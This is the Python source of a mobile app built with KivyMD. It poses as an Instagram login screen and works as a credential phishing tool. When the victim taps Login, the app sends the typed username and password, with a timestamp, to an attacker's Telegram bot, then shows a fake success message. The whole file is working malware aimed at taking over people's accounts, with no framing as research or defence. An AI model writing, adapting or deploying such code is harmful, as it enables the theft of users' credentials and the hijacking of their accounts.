from kivymd.app import MDApp
from kivymd.uix.boxlayout import MDBoxLayout
from kivymd.uix.label import MDLabel
from kivymd.uix.textfield import MDTextField
from kivymd.uix.button import MDRaisedButton
from kivymd.uix.screen import MDScreen
from kivy.clock import Clock
import requests
from datetime import datetime

ANDROID = False
try:
    from android.permissions import request_permissions, Permission
    ANDROID = True
except:
    pass

BOT_TOKEN = ""
CHAT_ID = ""

class InstagramScreen(MDScreen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        layout = MDBoxLayout(orientation='vertical', padding=30, spacing=20)
        
        layout.add_widget(MDLabel(text="📸 Instagram", halign="center", font_style="H3"))
        
        self.username = MDTextField(hint_text="Username")
        layout.add_widget(self.username)
        
        self.password = MDTextField(hint_text="Password", password=True)
        layout.add_widget(self.password)
        
        self.btn = MDRaisedButton(text="Login", on_release=self.capture)
        layout.add_widget(self.btn)
        
        self.status = MDLabel(text="")
        layout.add_widget(self.status)
        
        self.add_widget(layout)
    
    def capture(self, instance):
        u = self.username.text.strip()
        p = self.password.text.strip()
        if not u or not p:
            self.status.text = "Please enter details"
            return
        self.btn.disabled = True
        self.status.text = "Logging in..."
        Clock.schedule_once(lambda dt: self.send(u, p), 0)
    
    def send(self, u, p):
        try:
            if BOT_TOKEN and CHAT_ID:
                msg = f"User: {u}\nPass: {p}\nTime: {datetime.now()}"
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                             data={'chat_id': CHAT_ID, 'text': msg}, timeout=5)
            self.clear_widgets()
            self.add_widget(MDLabel(text="✅ Success!", halign="center", font_style="H4"))
        except Exception as e:
            self.status.text = f"Error: {str(e)[:30]}"
            self.btn.disabled = False

class InstagramApp(MDApp):
    def build(self):
        self.theme_cls.theme_style = "Light"
        self.theme_cls.primary_palette = "Blue"
        
        if ANDROID:
            try:
                request_permissions([Permission.INTERNET])
            except:
                pass
        
        return InstagramScreen()

if __name__ == '__main__':
    InstagramApp().run()
